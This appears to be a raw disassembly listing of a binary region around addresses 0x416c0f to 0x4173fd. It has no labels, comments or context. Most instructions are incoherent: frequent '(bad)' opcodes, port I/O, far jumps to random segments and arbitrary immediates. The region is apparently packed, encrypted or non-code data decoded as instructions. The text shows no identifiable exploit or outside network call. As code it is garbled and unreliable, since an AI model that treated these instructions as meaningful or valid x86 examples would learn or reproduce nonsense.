  416c0f:	test   eax,0x61c137f4
  416c14:	js     0x416c92
  416c16:	retf   0xfd7d
  416c19:	sahf   
  416c1a:	rcr    DWORD PTR [ecx],cl
  416c1c:	sahf   
  416c1d:	mov    ds:0x3d75d97e,al
  416c22:	test   ah,dl
  416c24:	mov    dl,al
  416c26:	aaa    
  416c27:	aas    
  416c28:	push   edx
  416c29:	cmp    BYTE PTR [esi-0x1f0deabe],dh
  416c2f:	sbb    DWORD PTR [eax-0x38],esp
  416c32:	push   edi
  416c33:	fistp  DWORD PTR [edx-0x50]
  416c36:	jmp    0xc8a1:0x9cde2b29
  416c3d:	pop    edx
  416c3e:	in     al,dx
  416c3f:	pusha  
  416c40:	je     0x416bd2
  416c42:	ret    
  416c43:	or     DWORD PTR [eax+0x4d27afb8],edi
  416c49:	cs aam 0xea
  416c4c:	test   al,0x13
  416c4e:	sub    eax,0xc9478d3a
  416c53:	push   0xdd6beaf6
  416c58:	cmp    DWORD PTR [ecx],esp
  416c5a:	jbe    0x416c73
  416c5c:	aaa    
  416c5d:	or     BYTE PTR [esi-0x5ecbacca],al
  416c63:	push   ebp
  416c64:	fdivr  DWORD PTR [esi-0x7a]
  416c67:	adc    esp,DWORD PTR [edx]
  416c69:	ja     0x416c7b
  416c6b:	jb     0x416cb3
  416c6d:	inc    ebx
  416c6e:	xor    al,0x12
  416c70:	outs   dx,BYTE PTR ds:[esi]
  416c71:	sbb    ecx,DWORD PTR [edi]
  416c73:	push   cs
  416c74:	jb     0x416ce4
  416c76:	adc    DWORD PTR [ebx],0x3e
  416c79:	cmp    DWORD PTR [edi-0x3578fe6d],edi
  416c7f:	pushf  
  416c80:	shl    esp,0x82
  416c83:	pop    ds
  416c84:	cmp    BYTE PTR [esi],ch
  416c86:	pop    edi
  416c87:	sub    al,0xa1
  416c89:	mov    al,0xb9
  416c8b:	(bad)  
  416c8c:	pop    edx
  416c8d:	mov    BYTE PTR [ecx+0x6e],al
  416c90:	cmp    edx,DWORD PTR [ecx+0x9]
  416c93:	push   eax
  416c94:	daa    
  416c95:	and    DWORD PTR [esi-0x21],esi
  416c98:	stos   BYTE PTR es:[edi],al
  416c99:	push   ecx
  416c9a:	push   edx
  416c9b:	fild   WORD PTR [ebp+0x797e2367]
  416ca1:	dec    esi
  416ca2:	pop    ebp
  416ca3:	push   cs
  416ca4:	ja     0x416ccc
  416ca6:	pusha  
  416ca7:	inc    ebp
  416ca8:	retf   0xb8a2
  416cab:	pop    esp
  416cac:	gs arpl si,ax
  416caf:	out    dx,eax
  416cb0:	mov    dl,0x7f
  416cb2:	sbb    BYTE PTR [esi-0x769ddb3e],0x65
  416cb9:	sub    DWORD PTR [esi+0x1ffc8015],ebp
  416cbf:	xchg   ecx,eax
  416cc0:	lds    ebx,FWORD PTR ds:0xa467f97e
  416cc6:	dec    ecx
  416cc7:	push   ecx
  416cc8:	push   es
  416cc9:	dec    ecx
  416cca:	mov    ebp,DWORD PTR [ebp-0x7e]
  416ccd:	aas    
  416cce:	mov    WORD PTR [ebp+0x40],fs
  416cd1:	jg     0x416ccf
  416cd3:	lahf   
  416cd4:	ja     0x416d48
  416cd6:	stos   DWORD PTR es:[edi],eax
  416cd7:	les    esp,FWORD PTR [ecx]
  416cd9:	add    eax,0x985b2874
  416cde:	cmp    eax,0x27fb840
  416ce3:	stos   DWORD PTR es:[edi],eax
  416ce4:	inc    ecx
  416ce5:	adc    DWORD PTR [edi],0xffffff9e
  416ce8:	fcmovne st,st(7)
  416cea:	or     eax,0xb70f8b89
  416cef:	sub    eax,0x64d2b4ff
  416cf4:	out    dx,eax
  416cf5:	inc    di
  416cf7:	push   0xffffffbd
  416cf9:	cs cld 
  416cfb:	test   DWORD PTR [ebp-0x72],ebx
  416cfe:	jmp    0x416cf3
  416d00:	out    dx,al
  416d01:	aaa    
  416d02:	and    BYTE PTR [ebx-0xe050895],0x8c
  416d09:	call   0xcd9bb60a
  416d0e:	icebp  
  416d0f:	nop
  416d10:	sub    al,0x50
  416d12:	dec    ebx
  416d13:	scas   al,BYTE PTR es:[edi]
  416d14:	clc    
  416d15:	sbb    DWORD PTR [edi-0x52ab2cbd],edi
  416d1b:	fisubr WORD PTR [eax+0x293cba83]
  416d21:	bound  edx,QWORD PTR [ebx-0xe]
  416d24:	dec    esi
  416d25:	mov    bl,0x48
  416d27:	es sbb eax,0x5509361
  416d2d:	scas   eax,DWORD PTR es:[edi]
  416d2e:	sub    eax,0x14d651cb
  416d33:	call   0xe7606c88
  416d38:	stos   BYTE PTR es:[edi],al
  416d39:	fld    TBYTE PTR [esi+0x76]
  416d3c:	les    eax,FWORD PTR [ecx+0x1e]
  416d3f:	sub    al,0x43
  416d41:	jns    0x416d68
  416d43:	dec    ecx
  416d44:	dec    ebx
  416d45:	mov    ebp,0x3a1109a
  416d4a:	in     eax,0xf1
  416d4c:	sbb    ebp,esi
  416d4e:	lods   eax,DWORD PTR ds:[esi]
  416d4f:	outs   dx,BYTE PTR ds:[esi]
  416d50:	xor    edi,DWORD PTR [ebp-0x4af34ebc]
  416d56:	push   0x39
  416d58:	or     ebx,DWORD PTR [edx-0x2c]
  416d5b:	adc    DWORD PTR [ebx-0x7bed12e8],0xffffff87
  416d62:	adc    eax,0x4bb1bc0f
  416d67:	sbb    BYTE PTR [eax+ebp*1-0x71f2f0fa],0x6
  416d6f:	push   ebx
  416d70:	test   BYTE PTR [ecx+0x3d8bc045],0xc9
  416d77:	mov    ds:0x3f8b0042,eax
  416d7c:	add    DWORD PTR ds:0x42a399,edi
  416d82:	mov    eax,0x7510850
  416d87:	mov    edi,DWORD PTR ds:0x42a2e9
  416d8d:	mov    edi,DWORD PTR [edi]
  416d8f:	adc    DWORD PTR ds:0x42a2c1,edi
  416d95:	jmp    0x4172a7
  416d9a:	mov    eax,0xc1c9c1c9
  416da0:	(bad)  
  416da1:	retf   0x720e
  416da4:	or     ebx,ebp
  416da6:	data16 jae 0x416da0
  416da9:	push   ds
  416daa:	fmulp  st(1),st
  416dac:	jg     0x416e26
  416dae:	jae    0x416e2c
  416db0:	js     0x416e2a
  416db2:	sbb    BYTE PTR ds:0x6e5c30d,bl
  416db8:	sub    DWORD PTR [ecx+0x9],ebp
  416dbb:	mov    bh,0xd2
  416dbd:	jle    0x416e1f
  416dbf:	pop    esp
  416dc0:	test   eax,0x101d8c14
  416dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dc6:	fst    QWORD PTR [edx]
  416dc8:	je     0x416d6e
  416dca:	xor    DWORD PTR [edi],esi
  416dcc:	or     eax,0xeb8fd929
  416dd1:	shl    DWORD PTR [edi+0x55284435],0x51
  416dd8:	dec    ecx
  416dd9:	aad    0x7f
  416ddb:	sbb    al,0x1e
  416ddd:	pushf  
  416dde:	inc    esi
  416ddf:	and    BYTE PTR [esi],0xb0
  416de2:	fimul  DWORD PTR [edi]
  416de4:	retf   0x9cfe
  416de7:	dec    ebp
  416de8:	imul   eax,DWORD PTR [esp+edx*8-0x4],0x7e
  416ded:	mov    bh,BYTE PTR [ebx]
  416def:	mov    esp,0x47e597c0
  416df4:	mov    eax,0x9714758f
  416df9:	sub    edi,DWORD PTR [edi]
  416dfb:	shr    DWORD PTR [esi+ebp*8+0x35d94199],0xad
  416e03:	cdq    
  416e04:	sub    edx,DWORD PTR [edx]
  416e06:	pop    edx
  416e07:	ficom  DWORD PTR [edx-0x3ca7cf4c]
  416e0d:	scas   al,BYTE PTR es:[edi]
  416e0e:	fs popa 
  416e10:	in     al,dx
  416e11:	adc    cl,BYTE PTR [ebx]
  416e13:	rcl    BYTE PTR [esi+eiz*8],cl
  416e16:	dec    edx
  416e17:	jmp    0xfc40:0x189c04f8
  416e1e:	dec    ecx
  416e1f:	and    BYTE PTR [ebp+0x39],ah
  416e22:	test   eax,0xc95f8aa9
  416e27:	adc    esi,DWORD PTR [ebp-0x317e0443]
  416e2d:	nop
  416e2e:	fdivr  QWORD PTR [edi-0x35]
  416e31:	cmc    
  416e32:	out    dx,al
  416e33:	jmp    0x517e6b3d
  416e38:	push   0xffffffe5
  416e3a:	bound  edi,QWORD PTR gs:[ebx]
  416e3d:	fwait
  416e3e:	or     al,0x31
  416e40:	ins    BYTE PTR es:[edi],dx
  416e41:	pop    esi
  416e42:	push   ss
  416e43:	fistp  QWORD PTR [ebx+0x7]
  416e46:	xor    DWORD PTR [ecx-0x5d577c32],edi
  416e4c:	xchg   DWORD PTR [edx+eax*2],ebp
  416e4f:	jns    0x416e10
  416e51:	mov    eax,ds:0xf35eb8ec
  416e56:	mov    dl,0x20
  416e58:	pop    ebp
  416e59:	xchg   edx,eax
  416e5a:	jl     0x416ec0
  416e5c:	mov    dl,0x5c
  416e5e:	aam    0xf1
  416e60:	test   eax,0x1cd3a0b7
  416e65:	xchg   BYTE PTR [eax+eax*1+0x59],dl
  416e69:	add    cl,BYTE PTR [eax]
  416e6b:	jb     0x416e8a
  416e6d:	xor    DWORD PTR [esi-0x14],0x76
  416e71:	jl     0x416ebc
  416e73:	sub    BYTE PTR [ebp+0x358430bf],0xd6
  416e7a:	gs push es
  416e7c:	in     eax,0x83
  416e7e:	sbb    ch,BYTE PTR [eax+ebx*2-0x32]
  416e82:	cmp    DWORD PTR [esi-0x289651d8],edi
  416e88:	pop    edx
  416e89:	adc    DWORD PTR [ebp+0x17],edi
  416e8c:	dec    edx
  416e8d:	clc    
  416e8e:	pop    esp
  416e8f:	pop    ebp
  416e90:	adc    al,0x2a
  416e92:	cld    
  416e93:	repnz mov ds:0x15723f5f,eax
  416e99:	mov    BYTE PTR [edi],ah
  416e9b:	inc    edx
  416e9c:	sbb    BYTE PTR [ebx-0x52],dh
  416e9f:	leave  
  416ea0:	cdq    
  416ea1:	push   ds
  416ea2:	sub    ah,bl
  416ea4:	sub    esi,DWORD PTR [edi]
  416ea6:	dec    edi
  416ea7:	(bad)  
  416ea8:	cmp    DWORD PTR [ebx+ecx*8],0x19
  416eac:	call   0x4ad5f4ec
  416eb1:	xchg   edi,eax
  416eb2:	into   
  416eb3:	pop    esi
  416eb4:	adc    eax,0xa5f740e8
  416eb9:	mov    ds:0x1d1f7c74,eax
  416ebe:	cwde   
  416ebf:	(bad)  
  416ec0:	cbw    
  416ec2:	fcmovnu st,st(6)
  416ec4:	loop   0x416f22
  416ec6:	adc    DWORD PTR [ecx+0x4c73b7d],ecx
  416ecc:	fistp  QWORD PTR [edi+0x11297a4a]
  416ed2:	jns    0x416ecd
  416ed4:	shl    ebx,0x40
  416ed7:	jp     0x416f1b
  416ed9:	jno    0x416f0a
  416edb:	mov    bh,0x78
  416edd:	and    BYTE PTR [edi-0x1c41d3b8],dh
  416ee3:	cmp    DWORD PTR [esi+edx*1],0x6c
  416ee7:	sub    DWORD PTR [ecx-0x7db4f92b],ebp
  416eed:	mov    eax,0x4997a51c
  416ef2:	call   0x3d0a:0x5d3507bd
  416ef9:	in     eax,dx
  416efa:	jge    0x416ee2
  416efc:	enter  0xd506,0x74
  416f00:	add    esi,DWORD PTR [ecx-0x19]
  416f03:	jmp    0x416f78
  416f05:	xor    eax,0x83b0328e
  416f0a:	into   
  416f0b:	mov    ch,0x50
  416f0d:	fild   WORD PTR [edi-0x63]
  416f10:	mov    ebp,0x19f78737
  416f15:	cwde   
  416f16:	test   DWORD PTR [ebx+0xeeb8c28],ebp
  416f1c:	push   ebp
  416f1d:	mov    bl,0xe7
  416f1f:	pop    edi
  416f20:	jp     0x416eee
  416f22:	and    edi,esp
  416f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f25:	fldcw  WORD PTR [edi]
  416f27:	push   0x63
  416f29:	ret    
  416f2a:	mov    ebx,edx
  416f2c:	mov    BYTE PTR [ecx+0x38],ch
  416f2f:	jbe    0x416f47
  416f31:	in     al,dx
  416f32:	mov    ebx,0xcb5ebb01
  416f37:	mov    DWORD PTR [ebp-0x465b814d],ecx
  416f3d:	jo     0x416ed6
  416f3f:	adc    bl,cl
  416f41:	mov    edx,0xc55c40e0
  416f46:	loope  0x416ef0
  416f48:	adc    ecx,DWORD PTR [edi+0x4a4e3dcd]
  416f4e:	in     eax,0x4e
  416f50:	stos   BYTE PTR es:[edi],al
  416f51:	pop    edi
  416f52:	pop    ss
  416f53:	cs mov al,0xe2
  416f56:	fnstsw WORD PTR [eax+0x6e]
  416f59:	mov    eax,ds:0xcd77d72d
  416f5e:	fsub   QWORD PTR [eax+0x4e1d6c9e]
  416f64:	and    ebx,ebp
  416f66:	sahf   
  416f67:	xor    ch,BYTE PTR [ecx+0x7d]
  416f6a:	sbb    cl,BYTE PTR ds:[esp+edx*4]
  416f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6f:	jmp    0x8933:0x758ad989
  416f76:	stos   BYTE PTR es:[edi],al
  416f77:	mov    edx,0xa2f705ee
  416f7c:	push   ecx
  416f7d:	adc    cl,BYTE PTR [edx+ebx*2-0x73cc25f8]
  416f84:	dec    esi
  416f85:	push   ds
  416f86:	or     dl,BYTE PTR [ecx+esi*1]
  416f89:	xchg   esp,eax
  416f8a:	fmul   st(3),st
  416f8c:	shr    BYTE PTR [edx-0x2e],0x4a
  416f90:	xchg   esp,eax
  416f91:	retf   0xd545
  416f94:	pop    esi
  416f95:	jle    0x416f8c
  416f97:	dec    ecx
  416f98:	ror    ecx,1
  416f9a:	cld    
  416f9b:	(bad)  
  416f9c:	cli    
  416f9d:	loope  0x416f85
  416f9f:	ss in  al,0x9e
  416fa2:	push   ebx
  416fa3:	es retf 
  416fa5:	dec    ebx
  416fa6:	ins    DWORD PTR es:[edi],dx
  416fa7:	cwde   
  416fa8:	mov    cs,WORD PTR [ecx]
  416faa:	push   edi
  416fab:	rol    dl,cl
  416fad:	(bad)  
  416fae:	push   edi
  416faf:	jo     0x416fd5
  416fb1:	int    0x25
  416fb3:	jle    0x416f60
  416fb5:	mov    al,0xfe
  416fb7:	shr    bl,cl
  416fb9:	inc    ebx
  416fba:	jne    0x416f4e
  416fbc:	fcom   st(4)
  416fbe:	xchg   ecx,esp
  416fc0:	mov    bh,0x2
  416fc2:	xchg   edx,eax
  416fc3:	adc    al,0xd2
  416fc5:	xchg   esi,eax
  416fc6:	dec    ecx
  416fc7:	inc    eax
  416fc8:	(bad)  
  416fc9:	fimul  WORD PTR [esi-0x5c]
  416fcc:	addr16 sahf 
  416fce:	cli    
  416fcf:	div    al
  416fd1:	mov    ah,0x22
  416fd3:	leave  
  416fd4:	add    dl,BYTE PTR ds:0x543ba858
  416fda:	fstp   QWORD PTR ds:[ecx+0x65]
  416fde:	jmp    0xef09:0x8209fc6
  416fe5:	mov    BYTE PTR [esi-0x3995fcc],ah
  416feb:	shl    DWORD PTR [edx+eax*8],cl
  416fee:	mov    edi,0xd5d35f86
  416ff3:	cld    
  416ff4:	mov    edi,0x3d3a4de
  416ff9:	sbb    ecx,DWORD PTR [ebp+0x2d596011]
  416fff:	mul    bl
  417001:	sub    al,0x23
  417003:	or     eax,0xed0a508d
  417008:	push   eax
  417009:	sub    DWORD PTR [esi+0x21],eax
  41700c:	lods   al,BYTE PTR ds:[esi]
  41700d:	jl     0x417013
  41700f:	jno    0x416f9f
  417011:	inc    edi
  417012:	sub    eax,0x2f2f55ea
  417017:	mov    dh,0x57
  417019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41701a:	fs xor eax,0x12ecc573
  417020:	cmc    
  417021:	jns    0x417048
  417023:	or     edx,DWORD PTR [ebx+0x17]
  417026:	push   ecx
  417027:	xchg   ecx,eax
  417028:	dec    ebx
  417029:	mov    ch,0x7e
  41702b:	or     esi,ecx
  41702d:	or     al,0x23
  41702f:	mov    al,0xea
  417031:	inc    esi
  417032:	cli    
  417033:	test   DWORD PTR [edx+0x9b64184],0x3fab316a
  41703d:	dec    ecx
  41703e:	cmp    eax,0x385a79c3
  417043:	sbb    DWORD PTR [ecx+0x9],edi
  417046:	idiv   BYTE PTR [ebx-0x752f83e0]
  41704c:	repz jae 0x416fd6
  41704f:	cdq    
  417050:	sahf   
  417051:	xchg   esp,eax
  417052:	cmovl  eax,DWORD PTR [esi-0x4648f41d]
  417059:	mov    dl,0xa6
  41705b:	pusha  
  41705c:	xchg   edi,eax
  41705d:	clc    
  41705e:	xchg   dh,bl
  417060:	jmp    0x4f70:0x37c02e62
  417067:	and    DWORD PTR [eax+0x79cfa060],ebp
  41706d:	mov    edi,0x6c9f5570
  417072:	mov    ecx,0xd2e3c424
  417077:	(bad)  
  417078:	mov    ebx,0xfdf826ac
  41707d:	mov    bl,0x2
  41707f:	inc    ebx
  417080:	pop    ebp
  417081:	or     eax,DWORD PTR [esi-0x79194b76]
  417087:	cmc    
  417088:	(bad)  
  417089:	mov    ds:0x7a5a5b0a,eax
  41708e:	(bad)  
  41708f:	das    
  417090:	das    
  417091:	pop    edi
  417092:	jmp    0x4170b5
  417094:	adc    eax,0x442c933b
  417099:	push   ebp
  41709a:	sub    DWORD PTR [eax],ebx
  41709c:	pop    edi
  41709d:	(bad)  
  41709e:	scas   eax,DWORD PTR es:[edi]
  41709f:	push   ss
  4170a0:	loope  0x417079
  4170a2:	pop    ebx
  4170a3:	ins    DWORD PTR es:[edi],dx
  4170a4:	rcl    BYTE PTR [ecx-0x12e9d007],1
  4170aa:	in     eax,0x31
  4170ac:	push   ss
  4170ad:	push   ecx
  4170ae:	mov    bl,0x7b
  4170b0:	or     eax,0xcac8723b
  4170b5:	pop    edi
  4170b6:	xor    DWORD PTR [ecx],esp
  4170b8:	(bad)  
  4170b9:	and    BYTE PTR [eax-0x32],dh
  4170bc:	jle    0x417098
  4170be:	bnd fs jns 0x41705b
  4170c2:	xchg   edi,eax
  4170c3:	xlat   BYTE PTR ds:[ebx]
  4170c4:	dec    esi
  4170c5:	and    DWORD PTR [edx+0x529179c8],ecx
  4170cb:	cs pop edx
  4170cd:	xor    esp,esi
  4170cf:	or     al,ch
  4170d1:	or     BYTE PTR [edx+0x627b848f],cl
  4170d7:	fisttp DWORD PTR [ecx-0x5eb5bea9]
  4170dd:	gs clc 
  4170df:	cmp    al,0xd1
  4170e1:	mov    dh,0xaa
  4170e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170e4:	or     DWORD PTR [ebx],ebx
  4170e6:	jno    0x417138
  4170e8:	rcr    BYTE PTR [edi],1
  4170ea:	xchg   edi,eax
  4170eb:	pop    ecx
  4170ec:	enter  0xb535,0x96
  4170f0:	sbb    BYTE PTR [eax],ch
  4170f2:	fstp   DWORD PTR [ecx]
  4170f4:	mov    dl,BYTE PTR [esp+edx*8-0x69ba6fbd]
  4170fb:	rcl    ecx,1
  4170fd:	dec    eax
  4170fe:	cmp    eax,0xae3613e0
  417103:	(bad)  
  417104:	mov    dh,cl
  417106:	(bad)  
  417108:	loopne 0x417107
  41710a:	pop    esi
  41710b:	lds    esi,FWORD PTR [ecx+0x4e]
  41710e:	test   DWORD PTR [eax-0xb],ecx
  417111:	adc    eax,0x103b66b4
  417116:	ret    0xb701
  417119:	outs   dx,BYTE PTR ds:[esi]
  41711a:	dec    ebp
  41711b:	sbb    DWORD PTR [ebp+ebp*2-0x24],0x90c0e22e
  417123:	mov    ch,dh
  417125:	xchg   edx,eax
  417126:	jmp    0x4170ba
  417128:	xor    al,BYTE PTR [eax+ebp*2]
  41712b:	mov    ds:0x3810db9e,al
  417130:	push   0xfffffff7
  417132:	rol    DWORD PTR [esi+0x49],1
  417135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417136:	pop    esi
  417137:	push   0xffffffaa
  417139:	pop    DWORD PTR [ecx+0x940162c]
  41713f:	push   edi
  417140:	xor    DWORD PTR [ebp+edx*2-0x55707c26],eax
  417147:	fbld   TBYTE PTR [esi+0x6b1f7083]
  41714d:	dec    esp
  41714e:	add    edx,DWORD PTR [edx]
  417150:	cs xchg edx,eax
  417152:	jns    0x417187
  417154:	outs   dx,BYTE PTR ds:[esi]
  417155:	dec    DWORD PTR [edi]
  417157:	rcr    BYTE PTR [ecx-0x7f],cl
  41715a:	mov    esi,0x49cca6d8
  41715f:	adc    ebp,DWORD PTR [edx]
  417161:	dec    ecx
  417162:	push   esp
  417163:	pop    ss
  417164:	fimul  WORD PTR [ebp-0x56]
  417167:	pop    esi
  417168:	mov    ebp,0x22f6ff99
  41716d:	jbe    0x4171e1
  41716f:	test   BYTE PTR [ecx-0xe1107ab],0x5c
  417176:	shl    eax,0x14
  417179:	pop    esp
  41717a:	aad    0xcf
  41717c:	push   0x667fa150
  417181:	xor    dh,cl
  417183:	int    0x2
  417185:	cs call 0x52d4:0xc6f6ba88
  41718d:	into   
  41718e:	jecxz  0x417205
  417190:	imul   esp,DWORD PTR [edi-0x43],0xffffff88
  417194:	mov    bh,0xa4
  417196:	fidiv  WORD PTR [eax+0x3652f8de]
  41719c:	ja     0x4171d2
  41719e:	jl     0x41712f
  4171a0:	shr    eax,0x16
  4171a3:	fst    DWORD PTR [ecx-0x49]
  4171a6:	mov    ah,0xd7
  4171a8:	stos   BYTE PTR es:[edi],al
  4171a9:	lahf   
  4171aa:	outs   dx,BYTE PTR ds:[esi]
  4171ab:	sti    
  4171ac:	jecxz  0x41716d
  4171ae:	sbb    DWORD PTR [edx+0x5d96b9a0],esi
  4171b4:	je     0x417143
  4171b6:	cmp    BYTE PTR [edx+0x781c2b9f],dh
  4171bc:	mov    ebx,0x4a2eac2
  4171c1:	mov    ecx,ebp
  4171c3:	mov    DWORD PTR [edx-0x54],esp
  4171c6:	test   DWORD PTR [eax-0x9],ecx
  4171c9:	jg     0x417240
  4171cb:	cmp    DWORD PTR [ecx-0x45],edi
  4171ce:	call   0x3158:0x5a0589ec
  4171d5:	and    eax,0x70967f30
  4171da:	aam    0xd3
  4171dc:	popf   
  4171dd:	bound  esp,QWORD PTR [ebp+0x554cfddf]
  4171e3:	mov    ah,0xa2
  4171e5:	in     al,0xc0
  4171e7:	jnp    0x417211
  4171e9:	jnp    0x417223
  4171eb:	pop    ebx
  4171ec:	pop    edx
  4171ed:	jg     0x417193
  4171ef:	adc    cl,ch
  4171f1:	sbb    DWORD PTR [ebp+0x55f68911],edi
  4171f7:	dec    eax
  4171f8:	xchg   edi,eax
  4171f9:	loope  0x417266
  4171fb:	add    eax,0xb597837e
  417200:	cli    
  417201:	jp     0x417239
  417203:	out    dx,al
  417204:	mov    ch,0xd1
  417206:	pop    edi
  417207:	out    dx,al
  417208:	ins    DWORD PTR es:[edi],dx
  417209:	adc    BYTE PTR [ebx+0x51a3d1d5],ah
  41720f:	test   al,al
  417211:	dec    ecx
  417212:	ja     0x41719f
  417214:	out    0x6f,eax
  417216:	and    esi,DWORD PTR [ecx+0x63]
  417219:	jns    0x41719d
  41721b:	jne    0x4171a2
  41721d:	shl    DWORD PTR [esi],cl
  41721f:	lds    edi,FWORD PTR [edi+edx*4+0x179a5e68]
  417226:	mov    edi,0x3dc12573
  41722b:	lock iret 
  41722d:	pop    edx
  41722e:	mov    fs,edx
  417230:	addr16 fcmovnb st,st(1)
  417233:	ret    
  417234:	iret   
  417235:	xor    esp,edx
  417237:	inc    sp
  417239:	push   ds
  41723a:	jns    0x417285
  41723c:	bound  ebx,QWORD PTR [edi-0x52]
  41723f:	mov    al,ds:0x257593e7
  417244:	and    ah,cl
  417246:	test   eax,0x993fadcf
  41724b:	jmp    0xed617412
  417250:	retf   
  417251:	jmp    0xd36d:0xcb792800
  417258:	outs   dx,DWORD PTR ds:[esi]
  417259:	cmp    eax,0xcb523093
  41725e:	ins    DWORD PTR es:[edi],dx
  41725f:	mov    esi,0x115ae71e
  417264:	out    dx,eax
  417265:	mov    dl,0x9b
  417267:	out    0x5d,al
  417269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41726a:	cld    
  41726b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41726c:	cmp    eax,ebx
  41726e:	inc    ebp
  41726f:	mov    ah,0x54
  417271:	not    DWORD PTR [eax-0x32196304]
  417277:	and    al,0x72
  417279:	mov    DWORD PTR [edx-0x77],esp
  41727c:	cmp    edi,DWORD PTR [ebp+0x54]
  41727f:	ins    DWORD PTR es:[edi],dx
  417280:	inc    eax
  417281:	rcl    esi,0x22
  417284:	pop    edx
  417285:	stos   BYTE PTR es:[edi],al
  417286:	inc    esp
  417287:	leave  
  417288:	jbe    0x4172cf
  41728a:	inc    ecx
  41728b:	lods   eax,DWORD PTR ds:[esi]
  41728c:	cmp    al,0x68
  41728e:	push   ebx
  41728f:	sti    
  417290:	cld    
  417291:	jp     0x4172aa
  417293:	or     al,0x44
  417295:	aas    
  417296:	adc    edi,DWORD PTR [ebx-0x7783c300]
  41729c:	enter  0x28f7,0x59
  4172a0:	jp     0x4172c6
  4172a2:	js     0x4172ee
  4172a4:	mov    DWORD PTR [bx+si],ebp
  4172a7:	xor    edx,eax
  4172a9:	jmp    0x4177bb
  4172ae:	(bad)  
  4172af:	leave  
  4172b0:	int3   
  4172b1:	leave  
  4172b2:	rcr    ecx,1
  4172b4:	fxch   st(1)
  4172b6:	aad    0x44
  4172b8:	push   esp
  4172b9:	adc    eax,0xbe16c53c
  4172be:	ror    esp,1
  4172c0:	jg     0x41733a
  4172c2:	jae    0x417340
  4172c4:	js     0x41733e
  4172c6:	jge    0x417290
  4172c8:	jnp    0x417320
  4172ca:	add    DWORD PTR [ecx-0x47d760cf],eax
  4172d0:	pop    ecx
  4172d1:	in     eax,dx
  4172d2:	mov    BYTE PTR gs:[eax+0x743b864c],al
  4172d9:	leave  
  4172da:	xchg   esi,eax
  4172db:	sbb    al,0xb2
  4172dd:	xor    edx,ebx
  4172df:	jne    0x41727f
  4172e1:	mov    al,BYTE PTR [ebp-0x3c]
  4172e4:	xchg   edx,eax
  4172e5:	cmp    DWORD PTR [edi+0x43],eax
  4172e8:	adc    al,0x7f
  4172ea:	fisubr WORD PTR [eax]
  4172ec:	xor    al,0x1f
  4172ee:	call   0xbe22:0x76b7e5be
  4172f5:	fistp  QWORD PTR [ebx-0x457d26b3]
  4172fb:	sahf   
  4172fc:	cld    
  4172fd:	popa   
  4172fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ff:	sub    BYTE PTR ds:0x95a871c5,0xc3
  417306:	sub    ebx,ebx
  417308:	mov    ebp,0x711620d0
  41730d:	and    al,0x9b
  41730f:	popa   
  417310:	aam    0x3d
  417312:	xchg   edx,eax
  417313:	dec    ebp
  417314:	push   esi
  417315:	push   eax
  417316:	ret    0x688f
  417319:	daa    
  41731a:	les    ebx,FWORD PTR [esi]
  41731c:	es dec ecx
  41731e:	mov    ds:0x9cb28690,eax
  417323:	or     BYTE PTR [eax],0x61
  417326:	push   edx
  417327:	shl    BYTE PTR [esp+ebx*8-0x1a7f5434],0x21
  41732f:	add    ebx,DWORD PTR [eax+0x2bd1ea6a]
  417335:	mov    edi,0x60afda20
  41733a:	pop    ebp
  41733b:	inc    ecx
  41733c:	push   edi
  41733d:	push   ebx
  41733e:	stos   BYTE PTR es:[edi],al
  41733f:	fist   DWORD PTR [ebx+esi*2+0x494eb8bb]
  417346:	int    0x87
  417348:	mov    ecx,0x926e5d97
  41734d:	mov    ecx,0xa7dd9a63
  417352:	mov    dh,0xbe
  417354:	(bad)  
  417355:	mov    ebp,DWORD PTR [edx]
  417357:	shl    DWORD PTR [edi-0x387b13be],cl
  41735d:	mov    ecx,0x27375efd
  417362:	(bad)  
  417363:	xchg   ebx,eax
  417364:	aam    0x9e
  417366:	ins    DWORD PTR es:[edi],dx
  417367:	sub    BYTE PTR [ebp-0x41af43ff],ch
  41736d:	test   eax,0x74d831a2
  417372:	shl    BYTE PTR [ecx-0x5aefb4e8],cl
  417378:	mov    dh,0xec
  41737a:	data16 icebp 
  41737c:	inc    edi
  41737d:	push   edx
  41737e:	mov    dl,0x1a
  417380:	and    BYTE PTR [ecx-0x47],ch
  417383:	push   ecx
  417384:	pop    edx
  417385:	inc    edx
  417386:	xchg   BYTE PTR [eax],cl
  417388:	sbb    eax,0x878f10a1
  41738d:	test   al,0x27
  41738f:	aas    
  417390:	lds    ebx,FWORD PTR [edx-0x5b]
  417393:	js     0x417397
  417395:	in     eax,0xbb
  417397:	push   ds
  417398:	mov    esp,0x98a2f296
  41739d:	arpl   WORD PTR [esi+ecx*2],si
  4173a0:	shr    edx,0x32
  4173a3:	js     0x4173b3
  4173a5:	inc    edx
  4173a6:	icebp  
  4173a7:	test   al,0x0
  4173a9:	sub    al,0x28
  4173ab:	jmp    0x30406645
  4173b0:	nop
  4173b1:	pop    ebx
  4173b2:	imul   edx,ebp,0xac931ac3
  4173b8:	in     al,dx
  4173b9:	int3   
  4173ba:	cmc    
  4173bb:	add    BYTE PTR [ecx+0x40ec9cf],al
  4173c1:	js     0x4173fd
  4173c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173c4:	ret    
  4173c5:	in     eax,0x4b
  4173c7:	(bad)  
  4173c8:	cld    
  4173c9:	xor    eax,0x21e85730
  4173ce:	adc    eax,0x9d202b66
  4173d3:	cwde   
  4173d4:	and    al,0x55
  4173d6:	xchg   edi,eax
  4173d7:	leave  
  4173d8:	test   BYTE PTR [edx+0x27],0x15
  4173dc:	or     DWORD PTR [edx+0x53e8c673],0xe2dd525d
  4173e6:	sti    
  4173e7:	mov    dh,0x9c
  4173e9:	mov    ecx,0xeeaa4f16
  4173ee:	inc    BYTE PTR [ecx-0x51]
  4173f1:	arpl   WORD PTR [ebp+0x94788ab],dx
  4173f7:	push   ss
  4173f8:	lock rol bh,cl
  4173fb:	ret    
  4173fc:	cdq    
  4173fd:	fisubr WORD PTR ds:0xdb865840
